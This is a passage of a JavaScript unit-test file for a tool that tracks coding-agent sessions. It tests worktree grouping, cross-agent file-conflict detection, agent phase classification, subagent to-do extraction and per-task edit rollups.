  assert.equal(core.commonDir(bare), null, 'launching inside the bare dir (no .git child) → null');
});

test('session: commonDir returns null for a missing / pruned worktree admin dir', () => {
  const base = tmpWork();
  const wt = path.join(base, 'wtD');
  fs.mkdirSync(wt);
  fs.writeFileSync(path.join(wt, '.git'), `gitdir: ${path.join(base, 'gone', 'worktrees', 'wtD')}\n`);
  assert.equal(core.commonDir(wt), null, 'gitdir points at a pruned admin dir → null');
  const admin = path.join(base, 'present');
  fs.mkdirSync(admin, { recursive: true }); // admin dir exists but has no `commondir` file
  const wt2 = path.join(base, 'wtE');
  fs.mkdirSync(wt2);
  fs.writeFileSync(path.join(wt2, '.git'), `gitdir: ${admin}\n`);
  assert.equal(core.commonDir(wt2), null, 'admin dir without a commondir file → null');
});

test('session: repoKeyForSession memoizes by sessionId (key survives worktree pruning)', () => {
  const root = tmpWork();
  const gitDir = path.join(root, '.git');
  fs.mkdirSync(gitDir);
  fs.writeFileSync(path.join(gitDir, 'config'), BARE_FALSE);
  const key = fs.realpathSync(gitDir);
  const sid = 'sess-cache-' + Date.now() + '-' + Math.random();
  assert.equal(core.repoKeyForSession(sid, root), key, 'first resolve returns the key');
  fs.rmSync(gitDir, { recursive: true, force: true }); // prune the repo on disk
  assert.equal(core.commonDir(root), null, 'commonDir is now null after pruning');
  assert.equal(core.repoKeyForSession(sid, root), key, 'cached key survives the pruning');
});

test('session: firstCwdLine returns the first line bearing cwd, skipping leading metadata', () => {
  const dir = tmpWork();
  const f = path.join(dir, 't.jsonl');
  const lines = [
    JSON.stringify({ type: 'queue-operation', sessionId: 'S9' }), // no cwd (line 0 is not guaranteed)
    JSON.stringify({ type: 'queue-operation', sessionId: 'S9' }), // no cwd
    'not json at all', // tolerated: skipped, not thrown
    JSON.stringify({ type: 'user', cwd: '/Users/x/proj', sessionId: 'S9', gitBranch: 'feat/z' }),
    JSON.stringify({ type: 'user', cwd: '/other', sessionId: 'S9', gitBranch: 'main' }), // must NOT win
  ];
  fs.writeFileSync(f, lines.join('\n') + '\n');
  assert.deepEqual(core.firstCwdLine(f), { cwd: '/Users/x/proj', sessionId: 'S9', gitBranch: 'feat/z' });
  assert.equal(core.firstCwdLine(path.join(dir, 'nope.jsonl')), null, 'missing file → null');
  fs.writeFileSync(path.join(dir, 'empty.jsonl'), '');
  assert.equal(core.firstCwdLine(path.join(dir, 'empty.jsonl')), null, 'empty file → null');
});

test('session: firstCwdLine resolves a cwd line hidden PAST 256KB behind a fat leading line (self-session regression)', () => {
  // Real self-sessions begin with a huge queue-operation line; the first cwd line can sit ~380KB in.
  // A fixed 256KB prefix read used to miss it → the live agent silently dropped from every repo view.
  const dir = tmpWork();
  const f = path.join(dir, 'big.jsonl');
  const fat = JSON.stringify({ type: 'queue-operation', blob: 'x'.repeat(600 * 1024) }); // > 256KB, no cwd
  const cwdLine = JSON.stringify({ type: 'user', cwd: '/Users/x/live', sessionId: 'LIVE', gitBranch: 'main' });
  fs.writeFileSync(f, fat + '\n' + cwdLine + '\n');
  assert.deepEqual(core.firstCwdLine(f), { cwd: '/Users/x/live', sessionId: 'LIVE', gitBranch: 'main' },
    'cwd line past the old 256KB cap must still resolve');
});

// --- S3: repo-scoped worktree siblings + fleet conflicts (fleet.ts) -----------------------------
// Builds on S2's git-free commonDir/firstCwdLine: unions sessions across worktree project dirs and
// intersects the UNCAPPED file sets for cross-agent collisions. Fixtures reuse the S2 on-disk formats.

test('fleet: listRepoSiblings unions two worktree dirs of one repo (excludes an unrelated repo)', () => {
  freshHome();
  const base = tmpWork();
  // Main working tree (dir-.git) + a linked worktree (file-.git → shared commondir) = one repo group.
  const main = path.join(base, 'main');
  const gitDir = path.join(main, '.git');
  const admin = path.join(gitDir, 'worktrees', 'wtA');
  fs.mkdirSync(admin, { recursive: true });
  fs.writeFileSync(path.join(gitDir, 'config'), BARE_FALSE);
  fs.writeFileSync(path.join(admin, 'commondir'), '../..\n');
  const wtA = path.join(base, 'wtA');
  fs.mkdirSync(wtA);
  fs.writeFileSync(path.join(wtA, '.git'), `gitdir: ${admin}\n`);
  // An unrelated repo (its own .git) — must NOT be grouped with main/wtA.
  const other = path.join(base, 'other');
  fs.mkdirSync(path.join(other, '.git'), { recursive: true });
  assert.equal(core.commonDir(main), core.commonDir(wtA), 'sanity: main + wtA share a commonDir');
  assert.notEqual(core.commonDir(other), core.commonDir(main), 'sanity: other is a different repo');

  // One session per cwd, each transcript in its own mangled project dir carrying a real cwd line.
  const MAIN = 'wt-main', WTA = 'wt-a', OTHER = 'wt-other';
  const seedSession = (cwd, id, branch) => {
    const dir = core.projectDir(cwd);
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, id + '.jsonl'), JSON.stringify({ type: 'user', cwd, sessionId: id, gitBranch: branch }) + '\n');
  };
  seedSession(main, MAIN, 'main');
  seedSession(wtA, WTA, 'feat/x');
  seedSession(other, OTHER, 'main');

  const list = core.listRepoSiblings(main, MAIN);
  assert.deepEqual(list.map((s) => s.id).sort(), [WTA, MAIN].sort(), 'both worktree sessions unioned; the unrelated repo excluded');
  const sMain = list.find((s) => s.id === MAIN);
  const sWta = list.find((s) => s.id === WTA);
  assert.ok(sMain.self && !sWta.self, 'querying session flagged self; the sibling worktree is not');
  assert.equal(sMain.worktree, main, 'worktree is the session real launch cwd (main)');
  assert.equal(sWta.worktree, wtA, 'sibling worktree is its own cwd (wtA)');
  assert.equal(sMain.gitBranch, 'main');
  assert.equal(sWta.gitBranch, 'feat/x', 'branch read from the transcript, disambiguating the worktrees');
  assert.equal(sMain.phase, 'idle', 'S4 wires agentPhase in: a session with no tool activity phases as neutral idle');
});

test('fleet: fleetConflicts intersects the UNCAPPED allFiles — catches a sibling 21st shared file', () => {
  freshHome();
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const A = 'busy', B = 'other';
  const emptyTranscript = JSON.stringify({ message: { role: 'assistant', content: [] } }) + '\n';
  fs.writeFileSync(path.join(proj, A + '.jsonl'), emptyTranscript);
  fs.writeFileSync(path.join(proj, B + '.jsonl'), emptyTranscript);
  // Busy agent touches 21 distinct files; file #21 (index 20) is BEYOND the FILE_CAP=20 display slice.
  const files = Array.from({ length: 21 }, (_, i) => path.join(cwd, `f${i}.ts`));
  files.forEach((f, i) => seedEdit(A, f, null, `x${i}\n`));
  const shared = files[20];
  seedEdit(B, shared, null, 'y\n'); // the sibling also edits that 21st file → a real collision

  const list = core.listSiblings(cwd, A);
  const a = list.find((s) => s.id === A);
  assert.equal(a.files.length, 20, 'display list is capped at FILE_CAP');
  assert.equal(a.moreFiles, 1, 'one file elided from the display list');
  assert.equal(a.allFiles.length, 21, 'the uncapped set keeps all 21');
  assert.ok(!a.files.includes(shared), 'the 21st file is NOT in the capped display list');
  assert.ok(a.allFiles.includes(shared), 'the 21st file IS in the uncapped intersection set');

  const conflicts = core.fleetConflicts(list);
  assert.equal(conflicts.length, 1, 'exactly one collision — the shared 21st file');
  assert.equal(conflicts[0].file, shared, 'a capped intersection would have silently missed this');
  assert.deepEqual(conflicts[0].agents.sort(), [A, B].sort(), 'both agents named (no winner)');
  assert.ok(conflicts[0].anyPending, 'flagged pending — a live edit could be trampled');
  assert.equal(core.summarizeFleet(list).conflicts, 1, 'summary carries the conflict count');
});

test('fleet: fleetConflicts on disjoint file sets reports no collisions', () => {
  freshHome();
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const A = 'a', B = 'b';
  const t = JSON.stringify({ message: { role: 'assistant', content: [] } }) + '\n';
  fs.writeFileSync(path.join(proj, A + '.jsonl'), t);
  fs.writeFileSync(path.join(proj, B + '.jsonl'), t);
  seedEdit(A, path.join(cwd, 'a.ts'), null, '1\n');
  seedEdit(B, path.join(cwd, 'b.ts'), null, '2\n'); // different file → no overlap
  const list = core.listSiblings(cwd, A);
  assert.deepEqual(core.fleetConflicts(list), [], 'disjoint file sets → no collisions');
  assert.equal(core.summarizeFleet(list).conflicts, 0);
});

test('fleet: fleetConflicts flags a pending overlap with ≥1 ACTIVE holder (reviewed / all-idle do not) (0.8.0)', () => {
  freshHome();
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const A = 'a', B = 'b', C = 'c';
  const fresh = JSON.stringify({ message: { role: 'assistant', content: [] } }) + '\n';
  fs.writeFileSync(path.join(proj, A + '.jsonl'), fresh); // active (just written)
  fs.writeFileSync(path.join(proj, B + '.jsonl'), fresh); // active
  fs.writeFileSync(path.join(proj, C + '.jsonl'), fresh);
  const oldSecs = Date.now() / 1000 - 3600; // 1h ago → beyond FLEET_ACTIVE_MS
  fs.utimesSync(path.join(proj, C + '.jsonl'), oldSecs, oldSecs); // C is INACTIVE

  const live = path.join(cwd, 'live.ts'); // pending in A AND B (both active) → the ONLY live collision
  const reviewed = path.join(cwd, 'reviewed.ts'); // shared by A+B but REVIEWED in both → no live hazard
  const staleShare = path.join(cwd, 'stale.ts'); // pending in A (active) + C (INACTIVE) → not a live overlap
  seedEdit(A, live, null, '1\n');
  seedEdit(B, live, null, '2\n');
  const ra = seedEdit(A, reviewed, null, 'x\n');
  const rb = seedEdit(B, reviewed, null, 'y\n');
  core.setStatus(A, ra, 'kept'); // reviewed → drops out of pendingFiles
  core.setStatus(B, rb, 'undone');
  seedEdit(A, staleShare, null, 'p\n');
  seedEdit(C, staleShare, null, 'q\n');

  const list = core.listSiblings(cwd, A);
  const sa = list.find((s) => s.id === A);
  assert.ok(sa.pendingFiles.includes(live) && sa.pendingFiles.includes(staleShare), 'pendingFiles = A\'s pending distinct files');
  assert.ok(!sa.pendingFiles.includes(reviewed), 'a reviewed (kept) file is NOT in pendingFiles');
  assert.ok(!list.find((s) => s.id === B).pendingFiles.includes(reviewed), 'an undone file is NOT in pendingFiles');

  const conflicts = core.fleetConflicts(list);
  // 0.8.0 stabilization: widened from "both active" — a LIVE agent can trample an idle agent's pending
  // work (>60s without a write is routine for a long think), so active-vs-idle overlaps now flag too,
  // with activeAgents naming the side that's moving. An all-idle overlap still does not flag.
  assert.equal(conflicts.length, 2, 'the both-active file AND the active-vs-idle file both flag');
  const liveC = conflicts.find((k) => k.file === live);
  assert.deepEqual(liveC.agents.sort(), [A, B].sort(), 'both colliding agents named (no winner)');
  assert.deepEqual(liveC.activeAgents.sort(), [A, B].sort(), 'both holders are active here');
  const staleC = conflicts.find((k) => k.file === staleShare);
  assert.ok(staleC, 'a live agent overlapping an IDLE agent\'s pending file is a real hazard — flagged');
  assert.deepEqual(staleC.agents.sort(), [A, C].sort(), 'idle holders stay listed in agents');
  assert.deepEqual(staleC.activeAgents, [A], 'activeAgents names only the moving side (renderers dim the rest)');
  assert.ok(!conflicts.some((k) => k.file === reviewed), 'a historically-shared but REVIEWED file does NOT flag');
  assert.equal(core.summarizeFleet(list).conflicts, 2, 'summary counts both live collisions');

  // An ALL-idle overlap (nobody moving) is not a live hazard — prove it by aging A out too.
  const idleList = list.map((s) => ({ ...s, active: false }));
  assert.equal(core.fleetConflicts(idleList).length, 0, 'no active holder anywhere → nothing flags');
});

test('fleet: conflict detection is path-only — file contents never cross between agents', () => {
  freshHome();
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const A = 'a', B = 'b';
  const t = JSON.stringify({ message: { role: 'assistant', content: [] } }) + '\n';
  fs.writeFileSync(path.join(proj, A + '.jsonl'), t);
  fs.writeFileSync(path.join(proj, B + '.jsonl'), t);
  const F = path.join(cwd, 'secret.ts');
  const SECRET = 'SUPER_SECRET_TOKEN_abc123';
  seedEdit(A, F, null, SECRET + '\n'); // A creates the file with secret content
  seedEdit(B, F, 'stub\n', SECRET + '\n'); // B edits the same file → collision on F
  const list = core.listSiblings(cwd, A);
  const conflicts = core.fleetConflicts(list);
  assert.equal(conflicts.length, 1, 'the shared file collides');
  assert.equal(conflicts[0].file, F, 'the collision names the file PATH');
  assert.deepEqual(Object.keys(conflicts[0]).sort(), ['activeAgents', 'agents', 'anyPending', 'file'], 'no contents field on a collision');
  // The security boundary: nothing the fleet exposes contains any file CONTENTS.
  const exposed = JSON.stringify(conflicts) + JSON.stringify(list);
  assert.ok(!exposed.includes('SUPER_SECRET'), 'no file contents leak into fleet siblings or collisions');
});

// --- S4 (0.8.0): live phase + subagent todos + sidecar --------------------------------------------

// A bare transcript file (no project-dir mangling), optionally mtime-backdated by `ageMs` for staleness.
function writePhaseTranscript(dir, name, records, ageMs) {
  const p = path.join(dir, name);
  fs.writeFileSync(p, records.map((o) => (typeof o === 'string' ? o : JSON.stringify(o))).join('\n') + '\n');
  if (ageMs != null) {
    const d = new Date(Date.now() - ageMs);
    fs.utimesSync(p, d, d);
  }
  return p;
}
const asstToolUse = (id, name, input) => ({ message: { role: 'assistant', content: [{ type: 'tool_use', id, name, input: input || {} }] } });
const toolResult = (id, isError) => ({ message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: id, is_error: !!isError }] } });
const asstEnd = (text) => ({ message: { role: 'assistant', stop_reason: 'end_turn', content: [{ type: 'text', text: text || 'Done.' }] } });

test('actions: agentPhase classifies working / awaiting-input / awaiting-permission / errored / idle / done', () => {
  freshHome();
  const dir = tmpWork();

  // working: a trailing tool_use awaiting its result, fresh mtime.
  const working = writePhaseTranscript(dir, 'working.jsonl', [asstToolUse('t1', 'Bash', { command: 'npm test' })]);
  assert.equal(core.agentPhase(working), 'working');
  assert.equal(core.agentPhaseDetail(working).confidence, 'high', 'an active tool_use is structural');

  // awaiting-input: a trailing AskUserQuestion with no result — wins even when the mtime is fresh.
  const input = writePhaseTranscript(dir, 'input.jsonl', [asstToolUse('q1', 'AskUserQuestion', { questions: [{ question: 'which?' }] })]);
  assert.equal(core.agentPhase(input), 'awaiting-input');
  assert.equal(core.agentPhaseDetail(input).confidence, 'high');

  // awaiting-permission: the SAME pending tool_use but stale (a harness permission prompt writes nothing).
  const perm = writePhaseTranscript(dir, 'perm.jsonl', [asstToolUse('t1', 'Bash', { command: 'rm -rf build' })], 60_000);
  const permDetail = core.agentPhaseDetail(perm);
  assert.equal(permDetail.phase, 'awaiting-permission', 'pending tool_use + stale mtime => needs-attention');
  assert.equal(permDetail.confidence, 'heuristic', 'labeled a heuristic, never asserted as certain');

  // errored: the trailing event is an is_error tool_result.
  const errored = writePhaseTranscript(dir, 'errored.jsonl', [asstToolUse('b1', 'Bash', { command: 'x' }), toolResult('b1', true)]);
  assert.equal(core.agentPhase(errored), 'errored');

  // idle: a completed end_turn, fresh mtime.
  const idle = writePhaseTranscript(dir, 'idle.jsonl', [asstToolUse('b1', 'Bash', { command: 'x' }), toolResult('b1', false), asstEnd('All set.')]);
  assert.equal(core.agentPhase(idle), 'idle');

  // working (between steps): a trailing NON-error tool_result with no follow-up yet — the turn is unfinished
  // (a tool_result always obligates an assistant reply), so the agent is mid-turn generating the next step,
  // NOT idle. This is the live-session case: finished one tool, about to issue the next.
  const midStep = writePhaseTranscript(dir, 'midstep.jsonl', [asstToolUse('b1', 'Bash', { command: 'x' }), toolResult('b1', false)]);
  assert.equal(core.agentPhase(midStep), 'working', 'a trailing non-error tool_result is an unfinished turn => working');
  assert.equal(core.agentPhaseDetail(midStep).confidence, 'high', 'a tool_result mandates a follow-up — structural, not a guess');
  // …but the SAME trailing tool_result gone long-stale is an abandoned/crashed turn => done.
  const midStepStale = writePhaseTranscript(dir, 'midstep-stale.jsonl', [asstToolUse('b1', 'Bash', { command: 'x' }), toolResult('b1', false)], 30 * 60_000);
  assert.equal(core.agentPhase(midStepStale), 'done', 'a trailing tool_result gone long-stale => the turn was abandoned mid-flight');

  // done: the same completed turn, but long-stale mtime.
  const done = writePhaseTranscript(dir, 'done.jsonl', [asstToolUse('b1', 'Bash', { command: 'x' }), toolResult('b1', false), asstEnd('All set.')], 30 * 60_000);
  assert.equal(core.agentPhase(done), 'done');

  // A recovered error (agent spoke after the failed result) is NOT errored — only a TRAILING error is.
  const recovered = writePhaseTranscript(dir, 'recovered.jsonl', [asstToolUse('b1', 'Bash', { command: 'x' }), toolResult('b1', true), asstEnd('Recovered.')]);
  assert.equal(core.agentPhase(recovered), 'idle', 'a post-error end_turn recovers to idle, not errored');

  // Missing transcript => neutral idle (never asserts activity for a file that is not there).
  assert.equal(core.agentPhase(path.join(dir, 'nope.jsonl')), 'idle');
});

test('actions: agentPhase tail read is boundary-tolerant (drops a partial leading line past the tail cap)', () => {
  freshHome();
  const dir = tmpWork();
  // A leading record larger than the tail window, so the last-N-bytes read STARTS mid-line; the phase
  // must still resolve from the trailing records (the partial leading fragment is dropped, not parsed).
  const huge = { message: { role: 'assistant', content: [{ type: 'text', text: 'X'.repeat(200000) }] } };
  const p = writePhaseTranscript(dir, 'big.jsonl', [huge, asstToolUse('t9', 'Bash', { command: 'go' })]);
  assert.ok(fs.statSync(p).size > 128 * 1024, 'file exceeds the tail window');
  assert.equal(core.agentPhase(p), 'working', 'trailing tool_use classified despite a mid-file start');
});

test('subagents: subagentTodos extracts the latest TodoWrite + currentTask (in_progress) from the agent file', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'subtodos';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  fs.writeFileSync(path.join(proj, S + '.jsonl'), JSON.stringify({ message: { role: 'assistant', content: [] } })); // main transcript must exist
  const AG = 'abc123def456';
  const subDir = path.join(proj, S, 'subagents');
  fs.mkdirSync(subDir, { recursive: true });
  const subtx = [
    { isSidechain: true, message: { role: 'assistant', content: [{ type: 'tool_use', name: 'TodoWrite', input: { todos: [{ content: 'stale plan', status: 'pending' }] } }] } },
    { isSidechain: true, message: { role: 'assistant', content: [{ type: 'tool_use', name: 'TodoWrite', input: { todos: [
      { content: 'Read the parser', status: 'completed' },
      { content: 'Wire the linker', status: 'in_progress' },
      { content: 'Add a regression test', status: 'pending' },
    ] } }] } },
  ].map((o) => JSON.stringify(o)).join('\n');
  fs.writeFileSync(path.join(subDir, `agent-${AG}.jsonl`), subtx);

  const r = core.subagentTodos(cwd, S, AG);
  assert.equal(r.todos.length, 3, 'the latest TodoWrite supersedes the earlier one');
  assert.equal(r.currentTask, 'Wire the linker', 'currentTask = the in_progress todo');
  assert.ok(!r.todos.some((t) => t.content === 'stale plan'), 'the superseded list is gone');

  // No in_progress todo => currentTask is null (honest — never falls back to a guess).
  const AG2 = 'noinprog99';
  fs.writeFileSync(
    path.join(subDir, `agent-${AG2}.jsonl`),
    JSON.stringify({ isSidechain: true, message: { role: 'assistant', content: [{ type: 'tool_use', name: 'TodoWrite', input: { todos: [{ content: 'all done', status: 'completed' }] } }] } })
  );
  assert.equal(core.subagentTodos(cwd, S, AG2).currentTask, null, 'nothing in_progress => currentTask null');
  // A subagent with no file at all => empty, not a throw.
  assert.deepEqual(core.subagentTodos(cwd, S, 'ghost'), { todos: [], currentTask: null });
});

test('subagents: an async_launched subagent (no result/status) still reports a LIVE phase from its tail', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'asyncsub';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  // Main transcript spawns the agent but NEVER records a toolUseResult (async_launched: null metrics/status).
  fs.writeFileSync(
    path.join(proj, S + '.jsonl'),
    JSON.stringify({ timestamp: '2026-07-14T10:00:00.000Z', message: { role: 'assistant', content: [{ type: 'tool_use', id: 'tu1', name: 'Agent', input: { description: 'crunch', subagent_type: 'worker' } }] } })
  );
  const AG = 'live777';
  const subDir = path.join(proj, S, 'subagents');
  fs.mkdirSync(subDir, { recursive: true });
  // The subagent's own file ends on a tool_use awaiting its result — freshly written => it's WORKING now.
  fs.writeFileSync(
    path.join(subDir, `agent-${AG}.jsonl`),
    JSON.stringify({ isSidechain: true, agentId: AG, sessionId: S, timestamp: '2026-07-14T10:01:00.000Z', message: { role: 'assistant', content: [{ type: 'tool_use', id: 'st1', name: 'Bash', input: { command: 'make' } }] } })
  );

  const subs = core.parseSubagents(cwd, S);
  assert.equal(subs.length, 1, 'the async subagent is discovered from its own file');
  const s = subs[0];
  assert.equal(s.status, undefined, 'no parent toolUseResult => the stuck/null status');
  assert.equal(s.phase, 'working', 'phased LIVE from the transcript tail, not the missing status');
  assert.equal(s.running, true, 'a working subagent is running');
});

test('fleet: listSiblings wires each session\'s live phase via agentPhase (S4)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const WORK = 'wk1', WAIT = 'wt1';
  fs.writeFileSync(path.join(proj, WORK + '.jsonl'), JSON.stringify({ message: { role: 'assistant', content: [{ type: 'tool_use', id: 'b1', name: 'Bash', input: { command: 'ls' } }] } }));
  fs.writeFileSync(path.join(proj, WAIT + '.jsonl'), JSON.stringify({ message: { role: 'assistant', content: [{ type: 'tool_use', id: 'q1', name: 'AskUserQuestion', input: { questions: [{ question: 'go?' }] } }] } }));
  const list = core.listSiblings(cwd, WORK);
  assert.equal(list.find((s) => s.id === WORK).phase, 'working', 'active tool_use => working');
  assert.equal(list.find((s) => s.id === WAIT).phase, 'awaiting-input', 'pending AskUserQuestion => awaiting-input');
});

// --- S6: stable taskId (strict spans) + three-level rollups (§2.1/§2.2) ---

test('changemap: taskId is a content hash — stable across to-do reorder + identical-text collision (S6)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;

  // Pure-function contract: content-only hash. firstSeenTs never enters the hash, so identical text is
  // ONE id (an honest collision → one task), and reordering can't shift it (the old positional-ch bug).
  assert.equal(core.taskId('Build the parser', 0), core.taskId('Build the parser', 999999), 'firstSeenTs is not hashed — same text, same id');
  assert.equal(core.taskId('Build the parser', 0).length, 12, 'sha1 truncated to 12 hex chars');
  assert.notEqual(core.taskId('Build the parser', 0), core.taskId('Ship the parser', 0), 'different text → different id');

  // Build-level: the same content keeps its id no matter WHERE the to-do sits, via tasks[] (strict identities).
  const build = (S, todos) => {
    const cwd = tmpWork();
    const proj = core.projectDir(cwd);
    fs.mkdirSync(proj, { recursive: true });
    core.ensureStore(S);
    const snap = JSON.stringify({ timestamp: new Date(1000).toISOString(), message: { role: 'assistant', content: [
      { type: 'tool_use', id: 't1', name: 'TodoWrite', input: { todos } }] } });
    fs.writeFileSync(path.join(proj, S + '.jsonl'), snap);
    return core.buildChangeMap(cwd, S, { root: cwd });
  };
  const m1 = build('order1', [{ content: 'Alpha', status: 'in_progress' }, { content: 'Beta', status: 'pending' }]);
  const m2 = build('order2', [{ content: 'Beta', status: 'pending' }, { content: 'Alpha', status: 'in_progress' }]); // reordered
  const idOf = (m, content) => m.tasks.find((t) => t.content === content).taskId;
  assert.equal(idOf(m1, 'Alpha'), core.taskId('Alpha', 0), 'a task id is the content hash, not `ch0`');
  assert.equal(idOf(m1, 'Alpha'), idOf(m2, 'Alpha'), 'Alpha keeps its id though it moved from slot 0 to slot 1');

  // Duplicate-content to-dos: identical text is deterministically ONE strict task (an honest collision).
  const dup = build('dup', [{ content: 'Dup', status: 'in_progress' }, { content: 'Dup', status: 'pending' }]);
  assert.equal(dup.tasks.filter((t) => t.content === 'Dup').length, 1, 'identical text is one strict task, never two');
  assert.equal(dup.tasks[0].taskId, core.taskId('Dup', 0), 'keyed by the plain content hash');
});
test('changemap: strict spans never edge-fill — head/trailing edits are unassigned; 3-level rollups sum (S6)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'strict';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  core.ensureStore(S);

  // Explicit-ts edits (seedEdit ties ts to a sequential id, so append directly to place them precisely).
  const seedAt = (file, before, after, ts) => {
    const b = before === null ? null : core.writeBlob(S, Buffer.from(before));
    const a = after === null ? null : core.writeBlob(S, Buffer.from(after));
    return core.appendLog(S, { ts, tool: 'Edit', file, beforeBlob: b, afterBlob: a, status: 'pending' }).id;
  };
  const F = (n) => path.join(cwd, `f${n}.ts`);
  const id1 = seedAt(F(1), 'a\n', 'a\nb\n', 1000); // HEAD: before the first in_progress (2000) → unassigned
  const id2 = seedAt(F(2), 'a\n', 'a\nb\nc\n', 3000); // inside Task A's strict span [2000,4000)
  const id3 = seedAt(F(3), 'a\n', 'a\nb\n', 5000); // inside Task B's strict span [4000,6000)
  const id4 = seedAt(F(4), 'a\n', 'a\nb\n', 7000); // TRAILING: after Task B completed (6000) → unassigned
  core.setStatus(S, id2, 'kept');
  core.setStatus(S, id3, 'undone');

  const snap = (ts, todos) => JSON.stringify({ timestamp: new Date(ts).toISOString(), message: { role: 'assistant', content: [
    { type: 'tool_use', id: 't' + ts, name: 'TodoWrite', input: { todos } }] } });
  const main = [
    snap(2000, [{ content: 'Task A', status: 'in_progress' }, { content: 'Task B', status: 'pending' }]),
    snap(4000, [{ content: 'Task A', status: 'completed' }, { content: 'Task B', status: 'in_progress' }]),
    snap(6000, [{ content: 'Task A', status: 'completed' }, { content: 'Task B', status: 'completed' }]),
  ].join('\n');
  fs.writeFileSync(path.join(proj, S + '.jsonl'), main);

  const m = core.buildChangeMap(cwd, S, { root: cwd });
  const A = core.taskId('Task A', 0), B = core.taskId('Task B', 0);
  const tid = (id) => m.edits.find((e) => e.id === id).taskId;

  // --- strict-span attribution: NO edge fill onto the head/tail task (the BLOCKER fix) ---
  assert.equal(tid(id1), null, 'a pre-first-in_progress edit is unassigned, not force-filed onto the opening task');
  assert.equal(tid(id2), A, 'an edit inside Task A\'s real interval attributes to Task A');
  assert.equal(tid(id3), B, 'an edit inside Task B\'s real interval attributes to Task B');
  assert.equal(tid(id4), null, 'a post-last-completed edit is unassigned, not swept onto the last task');

  // --- rollupByTask: two task rolls + an EXPLICIT null (unassigned) bucket, sorted null-last ---
  const rt = m.rollupByTask;
  const un = rt.find((r) => r.taskId === null);
  assert.ok(un, 'the unassigned bucket is surfaced explicitly (taskId: null)');
  assert.equal(un.edits, 2, 'both the head and trailing gap edits land in unassigned');
  assert.equal(un.pending, 2, 'and they carry their pending status');
  assert.equal(rt[rt.length - 1].taskId, null, 'the null bucket sorts last');
  assert.equal(rt.find((r) => r.taskId === A).kept, 1, 'Task A\'s edit was kept');
  assert.equal(rt.find((r) => r.taskId === B).undone, 1, 'Task B\'s edit was reverted');

  // --- rollups conserve the totals (sums) across every dimension ---
  const totAdded = m.edits.reduce((n, e) => n + e.added, 0);
  const totRemoved = m.edits.reduce((n, e) => n + e.removed, 0);
  const sumRoll = (rows) => ({
    edits: rows.reduce((n, r) => n + r.edits, 0),
    added: rows.reduce((n, r) => n + r.added, 0),
    removed: rows.reduce((n, r) => n + r.removed, 0),
  });
  assert.deepEqual(sumRoll(rt), { edits: m.edits.length, added: totAdded, removed: totRemoved }, 'rollupByTask conserves edits/±lines');
  assert.deepEqual(sumRoll(m.rollupBySubagent), { edits: m.edits.length, added: totAdded, removed: totRemoved }, 'rollupBySubagent conserves totals');

  // no subagents here → every edit is main-chain (subagentId null) → one bucket
  assert.deepEqual(m.rollupBySubagent.map((r) => r.subagentId), [null], 'all edits are main-chain (subagentId null)');

  // --- rollupByAgent: one row per built map, worktree-aware when fed siblings ---
  const byAgent = core.rollupByAgent([m, { summary: { session: 'other' }, edits: [
    { added: 4, removed: 1, status: 'kept' }], files: [{}, {}] }]);
  assert.equal(byAgent.length, 2, 'one row per change-map');
  assert.deepEqual(byAgent[0], { session: S, edits: m.edits.length, added: totAdded, removed: totRemoved, pending: 2, kept: 1, undone: 1, files: m.files.length }, 'this session\'s totals');
  assert.deepEqual(byAgent[1], { session: 'other', edits: 1, added: 4, removed: 1, pending: 0, kept: 1, undone: 0, files: 2 }, 'the sibling\'s totals, kept separate');
});

test('changemap: session titles — ai-title outranks the first prompt; wrappers never win; strict stays honest', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;

  const build = (S, transcriptLines) => {
    const cwd = tmpWork();
    const proj = core.projectDir(cwd);
    fs.mkdirSync(proj, { recursive: true });
    core.ensureStore(S);
    const F = path.join(cwd, 'app.ts');
    const id = seedEdit(S, F, 'a\n', 'a\nb\n');
    fs.writeFileSync(path.join(proj, S + '.jsonl'), transcriptLines.join('\n'));
    return { m: core.buildChangeMap(cwd, S, { root: cwd }), id };
  };

  // --- a session with NO TodoWrite at all: everything is honestly unassigned ---
  const userMsg = JSON.stringify({ timestamp: new Date(500).toISOString(), message: { role: 'user', content: 'Fix the login flow so sessions persist' } });
  const { m: noTodo, id: e1 } = build('nt', [userMsg]);
  assert.ok(!('subtasks' in noTodo), 'no display-subtask layer (0.8.8)');
  assert.equal(noTodo.edits.find((e) => e.id === e1).taskId, null, 'no plan → the strict dimension reports unassigned');
  assert.equal(noTodo.summary.title, 'Fix the login flow so sessions persist', 'the session is titled from the first user prompt');

  // --- ai-title outranks the first prompt; no user line at all leaves the title empty ---
  const title = JSON.stringify({ type: 'ai-title', aiTitle: 'Login session persistence' });
  const { m: titled } = build('ntt', [title, userMsg]);
  assert.equal(titled.summary.title, 'Login session persistence', 'Claude Code\'s own title wins when present');
  const { m: bare } = build('ntb', ['']);
  assert.equal(bare.summary.title, '', 'no title, no prompt → empty string, never a guessed name');

  // --- command wrappers and tool_result-only user turns never become the session title ---
  const wrapper = JSON.stringify({ timestamp: new Date(100).toISOString(), message: { role: 'user', content: '<command-name>/effort</command-name>' } });
  const toolResult = JSON.stringify({ timestamp: new Date(200).toISOString(), message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: 'x', content: 'ok' }] } });
